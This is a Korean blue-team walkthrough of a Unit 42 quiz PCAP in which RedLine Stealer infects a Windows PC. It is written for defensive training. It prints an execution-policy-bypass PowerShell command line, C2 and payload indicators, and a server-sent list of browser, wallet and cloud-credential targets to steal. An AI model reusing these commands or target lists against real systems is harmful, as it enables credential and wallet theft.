---
title: RedLine Stealer — PowerShell 스크립트에서 net.tcp C2 정보 탈취까지 (Arkime 분석)
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - redline
  - infostealer
  - c2
---

# RedLine Stealer — PowerShell 스크립트에서 net.tcp C2 정보 탈취까지 { #redline-stealer }

!!! abstract "사례 요약"
    `coolweathercoat.com` 도메인의 윈도우 10 PC에서 사용자가 **PowerShell 스크립트**(`mystery_file.ps1`)를 실행했습니다. 스크립트는 공격자 서버에 "시작했다, 백신은 Windows Defender다"라고 보고하고, `.jpg`로 위장한 악성 실행 파일을 HTTPS로 받았습니다. 실행된 **RedLine Stealer**는 DNS 조회 없이 IP로 직접 **TCP 12432 포트**에 붙어, 서버가 내려 준 "훔칠 대상 목록"대로 정보를 모은 뒤 **약 540KB**를 한 번에 올려 보냈습니다. 화면 캡처, 시스템 정보, 프로세스 목록, Edge에 저장된 비밀번호, 문서 파일이 들어 있었어요. 캡처 전체가 **36초**밖에 안 되는 짧은 PCAP입니다.

| | |
|---|---|
| **증거** | Unit 42 Wireshark 퀴즈 2023년 7월 PCAP, 2023-07-10 22:39:22 – 22:39:58 UTC (36초), 세션 약 120개 |
| **환경** | 폐쇄망 가정(해시·평판 조회 없음). 분석 순서와 쿼리는 Arkime 기준, 디코딩은 CyberChef |
| **결과물** | 퀴즈 6문항의 답 |
| **관련 페이지** | [Arkime만으로 분석하기 — Trickbot 사례](arkime-only-credential-theft-tls-c2.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [Arkime로 PCAP 분석하기](../../network/arkime/offline-pcap-guide.md) |

!!! warning "먼저 혼자 풀어 보고 싶다면"
    아래부터는 정답이 나옵니다. 먼저 풀어 보려면 여기서 멈추고 이 6문항에 답해 보세요.

    1. 감염이 시작된 날짜와 시간(UTC)
    2. 감염된 윈도우 PC의 IP 주소
    3. MAC 주소
    4. 호스트이름
    5. 사용자 계정 이름
    6. 이 RedLine Stealer가 훔치려 한 정보의 종류

!!! note "이 페이지의 숫자에 대해"
    이 페이지는 PCAP을 Python으로 직접 분석해서 Arkime가 보여줄 값(세션, 바이트, 필드)을 계산하고, 그 값을 찾는 Arkime 쿼리와 함께 정리했습니다. 세션 수 같은 일부 숫자는 Arkime 화면과 조금 다를 수 있으니 직접 따라 할 때 확인하세요. 결과는 Unit 42 공식 정답과 [대조](#official-answers)했습니다.

!!! tip "이 페이지 읽는 법"
    [Trickbot 사례](arkime-only-credential-theft-tls-c2.md)와 같은 순서로 씁니다. 단계마다 **목적 → 쿼리 → 쿼리 해설 → 실제 결과 → 결과 읽기**. 쿼리는 코드 블록 오른쪽 **복사 버튼**으로 복사하세요. 시간 범위·시간대·SPI View 같은 기본 사용법은 Trickbot 사례의 [0~1단계](arkime-only-credential-theft-tls-c2.md#step-0)에 자세히 있습니다.

## 한눈에 보는 답 { #answers }

| # | 질문 | 답 | 상태 |
|---|---|---|---|
| 1 | 감염 시작 | **2023-07-10 22:39 UTC** (첫 악성 통신: 22:39:47 PowerShell HTTP 요청) | 확인됨 |
| 2 | IP | **10.7.10.47** | 확인됨 |
| 3 | MAC | **80:86:5b:ab:1e:c4** | 확인됨 |
| 4 | 호스트이름 | **DESKTOP-9PEA63H** | 확인됨 |
| 5 | 사용자 | **rwalters** | 확인됨 |
| 6 | 훔치려 한 정보 | 바탕화면·문서의 파일(`*.txt`, `*.doc*`, `*key*`, `*wallet*`, `*seed*`), 브라우저 사용자 데이터(Chromium 계열, Firefox 계열), 암호화폐 지갑(프로그램·브라우저 확장), 클라우드·개발 서비스 API 키와 자격 증명. 실제로 올라간 것: 화면 캡처, 시스템 정보, 프로세스 목록, Edge 저장 비밀번호 1개, `Top_secret_ducment.docx` | 확인됨 |

| 항목 | 값 |
|---|---|
| 네트워크 | 10.7.10.0/24, 게이트웨이 10.7.10.1, DC/DNS/DHCP **10.7.10.9 (WIN-S3WT6LGQFVX)**, 도메인 `coolweathercoat.com` |
| 초기 실행 | `powershell.exe ... & 'C:\Users\rwalters\Documents\mystery_file.ps1'` |
| 체크인 | `hxxp://623start[.]site/?status=start&av=Windows%20Defender`, `/?status=install` (195.161.114.3) |
| 페이로드 | `hxxp(s)://guiatelefonos[.]com/data/czx.jpg` (92.118.151.9), HTTPS로 약 353KB |
| C2 / 유출 | **194.26.135.119:12432**, .NET net.tcp(SOAP), 업로드 542,386바이트 |

---

## 0단계 — 데이터 범위와 전체 그림 { #step-0 }

**목적:** 데이터의 시작·끝, 크기, 내부 PC를 먼저 파악합니다.

**쿼리:** 시간 범위를 **All**로 바꾸고 검색창은 비운 채 Search. Sessions에서 Start Time 오름차순 / Stop Time 내림차순으로 시작·끝을 봅니다(방법은 [Trickbot 사례 1단계](arkime-only-credential-theft-tls-c2.md#data-range)).

**실제 결과:**

```text
Start  2023/07/10 22:39:22 UTC
End    2023/07/10 22:39:58 UTC   (duration 00:00:36)
Sessions about 120
Src IP 10.7.10.47 (118)   10.7.10.9 (1)   0.0.0.0 (1)
```

SPI View → General → Dst Port를 보면 이렇게 나옵니다(세션 수, 프로토콜/포트).

```text
udp 53 (34)   tcp 88 (26)   tcp 443 (20)   tcp 389 (14)   udp 389 (7)   tcp 135 (4)   tcp 49669 (3)
tcp 80 (2)    udp 67 (1)    udp 68 (1)     udp 5353 (1)   udp 137 (1)   udp 138 (1)   udp 123 (1)
tcp 445 (1)   tcp 55390 (1) tcp 12432 (1)
```

**결과 읽기:**

- **캡처가 36초**밖에 안 됩니다. 그리고 맨 처음 세션이 **DHCP**(`0.0.0.0:68 → 255.255.255.255:67`)입니다. PC가 막 켜졌거나 네트워크에 다시 붙으면서 IP를 받는 장면부터 시작한다는 뜻이에요.
- **내부 PC는 10.7.10.47 한 대**뿐입니다. 거의 모든 세션(118개)을 이 PC가 시작했습니다. 10.7.10.9는 DHCP 응답 하나만 시작했고 나머지는 받기만 하니 **서버**입니다. 0.0.0.0은 IP를 받기 전의 DHCP 요청입니다.
- 포트를 역할별로 나누면:

| 포트 | 프로토콜 | 판단 |
|---|---|---|
| 53, 88, 389, 445, 135, 49669·55390(동적 RPC), 123 | DNS, Kerberos, LDAP, SMB, RPC, NTP | PC가 도메인에 로그인할 때 나오는 **정상 AD 통신**. 모두 10.7.10.9로 감 |
| 67/68, 137/138, 5353 | DHCP, NetBIOS, mDNS | 정상 |
| 443 (20) | TLS | 대부분 Microsoft·Bing 서비스. 하나하나 [5단계](#step-5)에서 확인 |
| **80 (2)** | HTTP | **평문** — 가장 먼저 볼 곳 |
| **12432 (1)** | ??? | 표준 서비스가 쓰지 않는 포트. **가장 수상함** |

36초짜리 PCAP에서 "모르는 포트 하나"는 바로 눈에 띕니다. 그래도 순서대로 기본 정보부터 채우겠습니다. 보고서에는 IP·MAC·호스트이름·계정이 필요하니까요.

---

## 1단계 — DHCP로 IP, MAC, 호스트이름 찾기 (Q2~Q4) { #dhcp }

**목적:** PC가 IP를 받을 때 보내는 DHCP 요청에는 **MAC 주소와 호스트이름**이 들어 있습니다. 이 PCAP은 DHCP로 시작하니 가장 확실한 출처예요.

**쿼리:**

```text
protocols == dhcp
```

| 조각 | 뜻 |
|---|---|
| `protocols` | Arkime가 알아낸 프로토콜 필드 |
| `== dhcp` | DHCP 세션만 |

SPI View → **dhcp** 섹션 → **Load All**. 중요한 필드는 `dhcp.host`(호스트이름), `dhcp.mac`(클라이언트 MAC), `dhcp.classId`(벤더 클래스)입니다. 세션을 펼치면 요청과 응답 내용이 다 보입니다.

**실제 결과:**

```text
22:39:22.849  DHCP Request   0.0.0.0:68 → 255.255.255.255:67
              Client MAC        80:86:5b:ab:1e:c4
              Host Name (12)    DESKTOP-9PEA63H
              Client FQDN (81)  DESKTOP-9PEA63H.coolweathercoat.com
              Requested IP (50) 10.7.10.47
              Vendor class (60) MSFT 5.0

22:39:22.850  DHCP ACK       10.7.10.9:67 → 255.255.255.255:68
              Your IP           10.7.10.47
              Subnet mask       255.255.255.0
              Router            10.7.10.1
              DNS server        10.7.10.9
              Domain name       coolweathercoat.com
```

**결과 읽기:**

- **IP 10.7.10.47, MAC 80:86:5b:ab:1e:c4, 호스트이름 DESKTOP-9PEA63H** — Q2, Q3, Q4의 답입니다.
- `MSFT 5.0`은 윈도우 2000 이후 모든 윈도우가 보내는 DHCP 벤더 클래스예요. 윈도우 PC라는 근거입니다.
- DHCP 응답에서 **네트워크 정보**도 나옵니다. 대역 10.7.10.0/24(마스크 255.255.255.0), 게이트웨이 10.7.10.1, DNS와 DHCP 서버는 10.7.10.9, 도메인 `coolweathercoat.com`.
- **교차 확인:** 이 PC가 보낸 일반 패킷의 Src MAC도 `80:86:5b:ab:1e:c4`입니다. NetBIOS(137) 브로드캐스트에도 `DESKTOP-9PEA63H`와 도메인 `COOLWEATHERCOAT`가 나옵니다. 출처 두 곳이 같은 값을 주면 확실합니다.

!!! tip "DHCP가 없을 때"
    PC가 이미 IP를 갖고 있던 시점부터 캡처하면 DHCP가 없습니다. 그때는 NetBIOS(udp 137/138 브로드캐스트)의 이름, Kerberos의 `$`로 끝나는 cname(다음 단계), SMB 세션의 호스트 정보로 찾습니다.

---

## 2단계 — DC와 사용자 계정 찾기 (Q5) { #kerberos }

**목적:** 도메인 컨트롤러(DC)의 이름과, 이 PC에 로그인한 **사용자 계정**을 찾습니다.

### DC 찾기 (DNS SRV) { #dc }

윈도우 PC는 로그인할 때 "이 도메인의 DC가 어디야?"를 DNS의 **SRV 레코드**로 물어봅니다.

```text
host.dns == _ldap._tcp.dc._msdcs.*
```

| 조각 | 뜻 |
|---|---|
| `host.dns` | DNS로 질의한 이름 |
| `_ldap._tcp.dc._msdcs.*` | "DC의 LDAP 서비스는 어디?"라는 표준 질의. `*`는 뒤의 도메인 이름 아무거나 |

**실제 결과 (세션 상세의 DNS 응답):**

```text
Query   _ldap._tcp.dc._msdcs.coolweathercoat.com  (SRV)
Answer  SRV  win-s3wt6lgqfvx.coolweathercoat.com
Query   win-s3wt6lgqfvx.coolweathercoat.com  (A)
Answer  10.7.10.9
```

→ **DC는 10.7.10.9, 이름 WIN-S3WT6LGQFVX.** 이름이 `WIN-` + 무작위 글자인 건 윈도우 서버를 설치하고 이름을 바꾸지 않았을 때의 기본 형식이에요.

### 사용자 계정 찾기 (Kerberos) { #user }

```text
ip.src == 10.7.10.47 && protocols == krb5
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.7.10.47` | 감염 의심 PC가 시작한 연결 |
| `&&` | 그리고 |
| `protocols == krb5` | Kerberos 세션만 |

SPI View → **krb5** → **Load All** (필드 이름만 보이면 필드 이름을 누르거나 Load All).

**실제 결과:**

```text
cname   desktop-9pea63h$   rwalters
Realm   COOLWEATHERCOAT.COM
sname   krbtgt/COOLWEATHERCOAT.COM   ...
```

**결과 읽기:**

- 끝이 `$`인 **`desktop-9pea63h$`는 컴퓨터 계정**입니다. 1단계의 호스트이름과 같아요.
- `$`가 없는 **`rwalters`가 사용자 계정**입니다. Q5의 답입니다.
- 캡처 시작 직후(22:39:23~)에 Kerberos가 26번이나 나오는 것도 1단계의 해석과 맞습니다. PC가 켜지고 **사용자가 로그인하는 장면**이에요.

---

## 3단계 — DNS로 수상한 도메인 찾기 { #dns }

**목적:** PC가 어떤 이름을 조회했는지 보면 어디에 접속하려 했는지 알 수 있습니다. 정상 이름을 걸러내고 남는 것을 찾습니다.

**쿼리:**

```text
ip.src == 10.7.10.47 && protocols == dns
```

SPI View → **dns** → `host.dns` 값. Sessions에서 Start Time 오름차순으로 보면 순서도 보입니다.

**실제 결과 (시간 순서):**

```text
22:39:23-24  _ldap._tcp... / _kerberos._tcp... SRV, WIN-S3WT6LGQFVX, wpad.coolweathercoat.com  ← AD logon
22:39:23     dns.msftncsi.com                                      ← Windows "am I online?" check
22:39:33-34  api.msn.com, assets.msn.com, www.bing.com, r.bing.com, th.bing.com,
             fp.msedge.net, k-ring.msedge.net, l-ring.msedge.net, wac-ring.msedge.net,
             fp-as-nocache.azureedge.net, fp-vs.azureedge.net, fp-afd-nocache-ccp.azureedge.net,
             static-ecst.licdn.com, v20.events.data.microsoft.com,
             sat09prdapp01-canary-opaph.netmon.azure.com, <hex>.clo.footprintdns.com   ← Windows / Edge start-up
22:39:44     checkappexec.microsoft.com                            ← SmartScreen
22:39:46     evoke-windowsservices-tas.msedge.net, client.wns.windows.com   ← Windows services
22:39:47     623start.site        → 195.161.114.3                  ← ?
22:39:49     guiatelefonos.com    → 92.118.151.9                   ← ?
```

**결과 읽기:**

- 22:39:33~34에 Microsoft, Bing, MSN, Azure CDN 이름이 쏟아집니다. 로그인 직후 윈도우와 Edge가 시작될 때 나오는 **정상 잡음**이에요. `msedge.net`, `footprintdns.com`, `azureedge.net`은 Microsoft의 연결 품질 측정과 CDN입니다.
- **`checkappexec.microsoft.com` (22:39:44)** — Windows Defender **SmartScreen**이 "이 프로그램/파일을 실행해도 되나?"를 Microsoft에 물어보는 주소입니다. 정상 서비스지만, **사용자가 무언가를 실행하려 할 때** 나오는 통신이라 3초 뒤의 수상한 통신과 시점이 맞습니다. (무엇을 검사했는지는 암호화라 모릅니다. 추정)
- 남는 두 개, **`623start.site`**와 **`guiatelefonos.com`**은 회사 PC가 갈 이유가 없는 이름입니다. `.site`는 저렴하고 악용이 잦은 최상위 도메인이에요. 다음 단계에서 HTTP로 무엇을 했는지 봅니다.
- **나중을 위한 메모:** 12432 포트로 간 194.26.135.119는 이 목록에 **없습니다.** DNS 조회 없이 IP로 바로 접속했다는 뜻이에요. 악성코드 안에 IP가 박혀 있는(hard-coded) 경우의 특징입니다.

---

## 4단계 — 평문 HTTP: PowerShell의 보고와 다운로드 { #http }

**목적:** HTTP 2개 세션의 내용을 봅니다.

**쿼리:**

```text
ip.src == 10.7.10.47 && protocols == http
```

SPI View → **http** → Load All, 그리고 Sessions에서 두 세션을 펼쳐 Source / Destination 내용을 봅니다.

**실제 결과 — 세션 1 (195.161.114.3:80):**

```http
GET /?status=start&av=Windows%20Defender HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
Connection: Keep-Alive

GET /?status=install HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
```

```http
HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:39:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 14
Server: Apache/2.4.6 (CentOS) PHP/7.4.33
X-Powered-By: PHP/7.4.33

404 HTTP Error
```

**결과 읽기:**

- **User-Agent에 `WindowsPowerShell/5.1`**이 있습니다. PowerShell의 `Invoke-WebRequest`나 `Invoke-RestMethod`가 기본으로 붙이는 값이에요. 사람이 브라우저로 연 게 아니라 **PowerShell 스크립트가 요청**한 것입니다. (User-Agent는 바꿀 수 있지만, 일부러 이 값으로 위장하는 경우는 드물어서 꽤 믿을 만한 단서입니다.)
- URI를 조각내면:

```text
/?status=start                 → "the script has started"
&av=Windows%20Defender         → "the antivirus here is Windows Defender"  (%20 = space; CyberChef URL Decode)
/?status=install               → "now installing (next stage)"
```

  감염 PC가 **자기 상태와 백신 종류를 공격자에게 보고**하는 체크인입니다. 공격자는 백신에 따라 다른 페이로드를 줄 수도 있어요.
- 응답이 이상합니다. **상태 코드는 `200 OK`(성공)인데 본문은 `404 HTTP Error`**(14바이트)예요. 진짜 "없음"이라면 상태 코드가 404여야 합니다. 보안 장비나 분석가가 대충 봤을 때 "없는 페이지였네" 하고 넘어가게 하려는 위장일 수 있습니다. 어쨌든 **수신 기록용**으로만 쓰이는 서버로 보입니다.

**실제 결과 — 세션 2 (92.118.151.9:80):**

```http
GET /data/czx.jpg HTTP/1.1
Host: guiatelefonos.com
Connection: Keep-Alive
```

```http
HTTP/1.1 301 Moved Permanently
Server: nginx/1.20.2
Location: https://guiatelefonos.com:443/data/czx.jpg
```

**결과 읽기:**

- 이번 요청에는 **User-Agent가 아예 없습니다.** 브라우저는 항상 User-Agent를 보내요. 헤더가 `Host`와 `Connection` 두 줄뿐인 건 **프로그램이 최소한으로 만든 요청**이라는 표시입니다(.NET의 기본 웹 클라이언트 등).
- 서버가 **301로 HTTPS 주소로 보내**서, 실제 파일은 암호화된 443 연결로 내려옵니다. 평문에서 파일을 볼 수 없게 됐어요.
- 파일 이름이 `.jpg`지만, PowerShell 체크인 직후에 "이미지"를 받을 이유가 없습니다. **그림으로 위장한 페이로드**로 의심합니다.
- 시간 순서: 22:39:47.579 start → 22:39:48.415 install → **0.8초 뒤** 22:39:49.250 czx.jpg. "install"이라고 보고하자마자 페이로드를 받으러 갔어요.

---

## 5단계 — HTTPS 다운로드와 JA3 { #step-5 }

**목적:** 301 이후 HTTPS로 무엇을, 얼마나 받았는지 확인합니다.

**쿼리:**

```text
ip.dst == 92.118.151.9 && port.dst == 443
```

| 조각 | 뜻 |
|---|---|
| `ip.dst == 92.118.151.9` | guiatelefonos.com의 IP로 간 연결 |
| `port.dst == 443` | HTTPS 포트 |

**실제 결과 (세션 상세):**

```text
Time          2023/07/10 22:39:49.323 - 22:39:49.874 UTC   (0.55 s)
Src           10.7.10.47:49743   Packets 61    Databytes 413
Dst           92.118.151.9:443   Packets 263   Databytes 353,715
TLS           SNI guiatelefonos.com   TLSv1.2   Cipher 0xc02f (ECDHE_RSA_WITH_AES_128_GCM_SHA256)
              JA3  3b5074b1b5d032e5620f69f9f700ff0e
              JA3S 389ed42c02ebecc32e73aa31def07e14
Certificate   Subject CN guiatelefonos.com   SAN guiatelefonos.com, www.guiatelefonos.com
              Issuer  CN R3, O Let's Encrypt
              Not Before 2023-07-08 16:17:07 UTC   Not After 2023-10-06
```

**결과 읽기:**

- **서버 → PC 353,715바이트, PC → 서버 413바이트.** 요청 한 번에 약 345KB를 0.5초 만에 받았습니다. 암호화돼서 내용은 못 보지만, 4단계의 `czx.jpg`를 HTTPS로 다시 요청해서 받은 것입니다. (TLS 암호화 헤더 몫이 더해져서 실제 파일보다 조금 큽니다. Unit 42 해설에 따르면 이 파일은 348,160바이트짜리 RedLine 실행 파일이에요.)
- **인증서는 Let's Encrypt 정식 발급**입니다. 자체 서명이 아니어서 인증서만으로는 수상하지 않아요. 요즘 공격자들도 무료 인증서를 쉽게 받습니다. 발급일이 감염 **2일 전**(07-08)이지만, Let's Encrypt 인증서는 원래 90일마다 새로 받으니 이것만으로는 약한 근거입니다. 이 다운로드를 수상하게 보는 근거는 **인증서가 아니라 앞뒤 맥락**(PowerShell 체크인 → User-Agent 없는 요청 → .jpg 위장)입니다.

### JA3로 보면? { #ja3 }

이 PCAP은 앞서 나온 "감염 후 JA3가 늘어나면 감염 증거"라는 이야기를 직접 확인해 볼 좋은 예입니다.

```text
ip.src == 10.7.10.47 && protocols == tls
```

SPI View → **tls** → **JA3**:

```text
JA3                                  count   destinations (SNI)
6271f898ce5be7dd52b0fc260d0662b3     14      www.bing.com, r.bing.com, th.bing.com, *.msedge.net, *.azureedge.net,
                                             static-ecst.licdn.com, netmon.azure.com, checkappexec.microsoft.com
3b5074b1b5d032e5620f69f9f700ff0e      3      evoke-windowsservices-tas.msedge.net (22:39:46), client.wns.windows.com (22:39:46),
                                             guiatelefonos.com (22:39:49)  ← the payload download
37f463bf4616ecd445d4a1937da06e19      2      api.msn.com, assets.msn.com
28a2c9bd18a11de089ef85a160da29e4      1      v20.events.data.microsoft.com
```

- 페이로드 다운로드(`guiatelefonos.com`)의 JA3는 **윈도우 서비스(WNS 등)가 3초 전에 쓴 것과 같은 값**입니다. PowerShell/.NET이 윈도우 기본 TLS 기능을 쓰기 때문이에요. 그래서 **감염 뒤에 새 JA3가 생기지 않았습니다.**
- 그리고 C2(12432)는 **TLS가 아니라서 JA3 자체가 없습니다.**
- 즉 이 사례에서는 "JA3 개수 변화"로 감염을 잡을 수 없었습니다. JA3 변화는 **있으면 강한 정황, 없다고 깨끗하다는 뜻은 아닌** 근거라는 걸 보여 주는 예예요. 반대로 같은 JA3를 쓰더라도 **목적지(SNI)**&#8203;가 정상 Microsoft 서비스와 전혀 다른 이상한 도메인이라는 점은 눈에 띕니다. JA3는 목적지와 같이 읽어야 합니다.

---

## 6단계 — 이상한 포트로 C2 찾기 { #c2-hunt }

**목적:** 0단계에서 본 12432 포트를 정식으로 찾아냅니다. 다른 PCAP에서도 그대로 쓸 수 있는 방법이에요.

**쿼리:**

```text
ip.src == 10.7.10.47 && ip.dst != 10.0.0.0/8 && ip.dst != 224.0.0.0/4 && port.dst != 80 && port.dst != 443 && port.dst != 53
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.7.10.47` | 감염 의심 PC가 시작한 연결 |
| `ip.dst != 10.0.0.0/8` | 목적지가 내부망이 **아닌 것** |
| `ip.dst != 224.0.0.0/4` | 멀티캐스트(224~239) 제외. mDNS·IGMP 같은 잡음 |
| `port.dst != 80 && … != 443 && … != 53` | 웹, HTTPS, DNS 제외 |

**실제 결과:**

```text
22:39:50.151  10.7.10.47:49744 → 194.26.135.119:12432   tcp   Packets 380/407   Databytes 542,386 / 7,179
```

딱 하나 남습니다.

**결과 읽기:**

- **포트 12432**는 표준 서비스가 쓰지 않는 번호입니다.
- 3단계에서 봤듯이 이 IP에 대한 **DNS 조회가 없습니다**. 프로그램 안에 IP가 박혀 있다는 뜻이에요.
- 페이로드 다운로드가 끝난 22:39:49.874에서 **0.3초 뒤**(22:39:50.151)에 시작합니다. 받은 파일이 실행되자마자 접속한 것으로 보입니다.
- 그리고 무엇보다 **PC가 보낸 데이터(542,386바이트)가 받은 데이터(7,179바이트)보다 75배 많습니다.** 업로드, 즉 **유출**입니다.

---

## 7단계 — C2 세션 읽기: 프로토콜과 흐름 { #c2-session }

**목적:** 12432 세션이 어떤 프로토콜을 쓰고, 언제 무엇이 오갔는지 봅니다.

```text
ip.dst == 194.26.135.119 && port.dst == 12432
```

세션을 펼칩니다. Arkime에는 이 프로토콜을 해석하는 파서가 없어서 Protocols에 **`tcp`만** 나오고 HTTP·TLS 같은 섹션이 없습니다. 아래쪽 패킷 내용(Source / Destination)을 `ascii`로 보면 됩니다. 길어서 **Source Raw**로 내려받아 CyberChef **Strings**로 보는 게 편해요.

**실제 결과 — PC가 처음 보낸 내용:**

```text
00 01 00 01 02 02 1f  net.tcp://194.26.135.119:12432/  03 08 0c ...
```

```text
net.tcp://194.26.135.119:12432/
http://tempuri.org/Contract/MSValue1
Authorization   c75a68098b33270de4b87af925fb5ffd
```

**결과 읽기:**

- `net.tcp://`로 시작하는 건 **.NET의 WCF(Windows Communication Foundation) net.tcp 프로토콜**입니다. HTTP 대신 TCP 위에서 SOAP 메시지를 이진(binary) 형식으로 주고받아요. 그래서 평문 HTTP처럼 깔끔하게 읽히지는 않지만, 문자열은 그대로 보입니다. RedLine은 .NET으로 만든 악성코드라서 이 방식을 씁니다.
- **`http://tempuri.org/`**는 .NET 개발 도구가 이름 공간을 따로 정하지 않으면 넣는 **기본 자리표시 주소**입니다. 실제 웹사이트에 접속하는 게 아니에요. 정상 프로그램은 배포 전에 보통 바꾸기 때문에, 외부 IP와의 통신에서 `tempuri.org`가 보이면 대충 만든 .NET 프로그램(악성코드 포함)일 가능성이 큽니다.
- **`MSValue1`, `MSValue2`, `MSValue3`**은 호출하는 함수 이름입니다. 의미를 숨기려고 이름을 바꿔 놨어요.
- **`Authorization c75a6809…`**는 이 악성코드 빌드를 구분하는 키로 보입니다(추정). 같은 공격자의 다른 감염을 찾을 때 쓸 수 있는 지표예요.

**흐름 (시간 순서):**

```text
22:39:50.151  TCP connect (SYN → SYN-ACK → ACK)
22:39:50.425  PC → server   41 B      net.tcp preamble (address)
22:39:50.732  server → PC    1 B      preamble ack
22:39:50.753  PC → server   218 B     MSValue1  (check-in with Authorization key)
22:39:51.037  server → PC   159 B     MSValue1Response
22:39:51.042  PC → server   166 B     MSValue2  ("give me my settings")
22:39:51.347  server → PC   6,899 B   MSValue2Response  ← target list (step 8)
              ... about 5 seconds: the malware collects data on the PC ...
22:39:56.522  PC → server   541,961 B MSValue3  ← stolen data (step 9), 373 segments until 22:39:57.806
22:39:58.311  server → PC   120 B     MSValue3Response (ack)
```

- **"설정 받기 → 5초 동안 수집 → 한 번에 업로드"**&#8203;라는 전형적인 인포스틸러 흐름입니다.
- Trickbot처럼 연결을 몇 분씩 붙잡고 있거나 반복 접속하는 **비콘이 없습니다.** 8초 만에 끝나는 **한 번짜리** 연결이에요. 인포스틸러는 "훔치고 바로 빠지는" 경우가 많습니다. 보고서의 C2 칸에는 "single short session, no repeating beacon"이라고 씁니다.

---

## 8단계 — 서버가 내린 지시: 훔칠 대상 목록 (Q6) { #target-list }

**목적:** `MSValue2Response`(서버 → PC 6,899바이트)에 무엇을 훔치라고 적혀 있는지 봅니다.

세션의 **Destination** 쪽(서버가 보낸 것)을 `ascii`로 보거나, **Destination Raw** → CyberChef **Strings**.

**실제 결과 (발췌):**

```text
%userprofile%\Desktop|*.txt,*.doc*,*key*,*wallet*,*seed*|0
%userprofile%\Documents|*.txt,*.doc*,*key*,*wallet*,*seed*|0

%USERPROFILE%\AppData\Local\Google\Chrome\User Data
%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data
%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data
%USERPROFILE%\AppData\Roaming\Opera Software\
%USERPROFILE%\AppData\Local\Vivaldi\User Data
%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data
... (about 40 Chromium-based browsers)
%USERPROFILE%\AppData\Roaming\Mozilla\Firefox
%USERPROFILE%\AppData\Roaming\Thunderbird
%USERPROFILE%\AppData\Roaming\Waterfox
%USERPROFILE%\AppData\Local\Steam
%USERPROFILE%\AppData\Local\Battle.net

Armory  *.wallet      Atomic      Binance     Coinomi\Coinomi\wallets
Electrum\wallets      Ethereum\wallets        Exodus\exodus.wallet
Guarda                com.liberty.jaxx        Monero\wallets

nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom
hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink
fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet
... (about 30 wallet browser extensions)

AWS_ACCESS_KEY_ID  AWS_SECRET_ACCESS_KEY  AZURE_CLIENT_SECRET  AZURE_PASSWORD
GH_TOKEN  GITLAB_USER_LOGIN  DOCKER_PASSWORD  DOCKERHUB_PASSWORD  NPM_AUTH_TOKEN
SLACK_TOKEN  STRIPE_API_KEY  TWILIO_ACCOUNT_SID  HEROKU_API_KEY  VAULT_TOKEN ...
```

**결과 읽기 — 네 묶음으로 나뉩니다:**

| 묶음 | 내용 | 뜻 |
|---|---|---|
| **파일 수집** | 바탕화면·문서 폴더의 `*.txt`, `*.doc*`, `*key*`, `*wallet*`, `*seed*` | 메모장 비밀번호, 문서, 지갑 복구 문구(seed) 등. <code>&#124;0</code>은 하위 폴더 탐색 깊이 같은 옵션으로 보임(추정) |
| **브라우저** | Chromium 계열 약 40종의 `User Data`, Firefox 계열(Firefox, Waterfox, Thunderbird, Pale Moon 등), Steam, Battle.net | 저장된 비밀번호, 쿠키(로그인 세션), 자동완성, 카드 정보 |
| **암호화폐 지갑** | 데스크톱 지갑(Armory, Atomic, Electrum, Exodus, Monero …)과 지갑 확장 프로그램(Metamask, Phantom, Coinbase …). `nkbihf…`처럼 32글자 영문은 **크롬 확장 프로그램 ID** | 코인 지갑 파일과 키 |
| **API 키·토큰** | `AWS_…`, `AZURE_…`, `GH_TOKEN`, `DOCKER_PASSWORD`, `SLACK_TOKEN` … | 개발자 PC의 **환경 변수**에 들어 있는 클라우드·개발 서비스 비밀 키 |

이게 **Q6(무엇을 훔치려 했나)**&#8203;의 답입니다. 중요한 점은 이 목록이 **악성코드 안에 들어 있지 않고 서버가 실행 중에 내려 준다**는 거예요. 공격자는 서버 설정만 바꿔서 훔칠 대상을 바꿀 수 있습니다. 그래서 네트워크에서 이 응답을 보면 "이번 공격자가 무엇을 노렸는지"를 정확히 알 수 있어요.

---

## 9단계 — 실제로 올라간 것: 유출 내용 { #exfil }

**목적:** `MSValue3`(PC → 서버 541,961바이트)에 무엇이 들어 있었는지 봅니다. 보고서의 Exfil 칸(시간, 무엇을, 바이트, 방법)을 채우는 핵심 단계입니다.

**Source Raw**로 내려받아 CyberChef에서 엽니다. Recipe에 **Strings**를 넣으면 읽을 수 있는 글자만 나옵니다.

**실제 결과 (발췌, 비밀번호는 가림):**

```text
3154E784D973FE3C24082CC1E80F37A9                 ← hardware ID (victim identifier)
(UTC) Coordinated Universal Time                  ← time zone
rwalters                                          ← user name
Windows 10 Pro for Workstations x64               ← OS
English (United States)                           ← language
{Width=1440, Height=900}                          ← screen size
Windows Defender                                  ← antivirus
ID: 576, Name: csrss.exe, CommandLine:
ID: 4624, Name: explorer.exe, CommandLine: C:\Windows\Explorer.EXE
ID: 5760, Name: smartscreen.exe, CommandLine: C:\Windows\System32\smartscreen.exe -Embedding
ID: 3952, Name: powershell.exe, CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command"
    "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass };
     & 'C:\Users\rwalters\Documents\mystery_file.ps1'"
...
Total of RAM  32765.05 MB
Intel(R) Core(TM) i5-10200H CPU @ 2.40GHz
Microsoft_[Edge]  Default  https://www.overcoats-r-us.com/  rwalters@coolweathercoat.com  My_p@******
Top_secret_ducment.docx  C:\Users\rwalters\Documents\Top_secret_ducment.docx  PK ... word/document.xml ...
